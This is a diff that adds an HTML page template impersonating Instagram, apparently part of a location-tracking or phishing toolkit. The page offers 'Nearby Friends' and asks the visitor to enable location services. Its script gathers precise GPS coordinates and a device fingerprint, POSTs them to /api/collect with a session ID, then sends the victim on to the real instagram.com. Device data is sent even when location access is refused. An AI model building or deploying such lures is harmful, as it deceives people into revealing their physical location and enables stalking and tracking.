@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px 20px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .logo {
+            font-family: 'Billabong', cursive;
+            font-size: 48px;
+            margin-bottom: 30px;
+            background: linear-gradient(45deg, #405de6, #833ab4, #e1306c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .message {
+            margin-bottom: 30px;
+            color: #262626;
+            line-height: 1.5;
+        }
+        
+        .feature-box {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .feature-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #262626;
+        }
+        
+        .feature-description {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, #405de6, #833ab4);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: transform 0.2s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-1px);
+        }
+        
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #8e8e8e;
+        }
+        
+        .error {
+            color: #ed4956;
+            margin-top: 15px;
+            display: none;
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        
+        <div class="message">
+            <h3 style="margin-bottom: 15px;">Discover Friends Nearby</h3>
+            <p>Instagram wants to show you friends and popular places near your location. Enable location services to see what's happening around you!</p>
+        </div>
+        
+        <div class="feature-box">
+            <div class="feature-title">🗺️ Nearby Friends</div>
+            <div class="feature-description">See which of your friends are close by and connect in real life</div>
+            
+            <div class="feature-title">📍 Local Hotspots</div>
+            <div class="feature-description">Discover trending locations and popular spots in your area</div>
+            
+            <div class="feature-title">📸 Location Stories</div>
+            <div class="feature-description">View stories from people near your current location</div>
+        </div>
+        
+        <button class="btn" id="enableLocation">
+            📍 Enable Location Services
+        </button>
+        
+        <div class="loading" id="loading">
+            <i>🔄 Getting your location...</i>
+        </div>
+        
+        <div class="error" id="error"></div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/fingerprint.js') }}"></script>
+    <script>
+        const sessionId = '{{ session_id }}';
+        
+        document.getElementById('enableLocation').addEventListener('click', function() {
+            this.disabled = true;
+            this.textContent = 'Requesting Location...';
+            document.getElementById('loading').style.display = 'block';
+            
+            // Start device fingerprinting immediately
+            const deviceData = collectDeviceFingerprint();
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                        
+                        // Send collected data
+                        sendData({
+                            session_id: sessionId,
+                            location: locationData,
+                            device: deviceData,
+                            template: 'instagram'
+                        });
+                        
+                        // Simulate success and redirect
+                        document.getElementById('loading').innerHTML = '<i style="color: #4CAF50;">✅ Location enabled successfully!</i>';
+                        setTimeout(() => {
+                            window.location.href = 'https://instagram.com';
+                        }, 2000);
+                    },
+                    function(error) {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('error').style.display = 'block';
+                        
+                        let errorMessage = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'Location access denied. Please enable location services to use this feature.';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'Location information is unavailable.';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'Location request timed out.';
+                                break;
+                            default:
+                                errorMessage = 'An unknown error occurred.';
+                                break;
+                        }
+                        document.getElementById('error').textContent = errorMessage;
+                        
+                        // Still send device data even if location fails
+                        sendData({
+                            session_id: sessionId,
+                            device: deviceData,
+                            template: 'instagram',
+                            location_error: errorMessage
+                        });
+                        
+                        // Reset button
+                        const btn = document.getElementById('enableLocation');
+                        btn.disabled = false;
+                        btn.textContent = '📍 Try Again';
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('error').textContent = 'Geolocation is not supported by this browser.';
+                
+                // Send device data without location
+                sendData({
+                    session_id: sessionId,
+                    device: deviceData,
+                    template: 'instagram',
+                    location_error: 'Geolocation not supported'
+                });
+            }
+        });
+        
+        function sendData(data) {
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(error => {
+                console.error('Error sending data:', error);
+            });
+        }
+    </script>
+</body>
+</html>
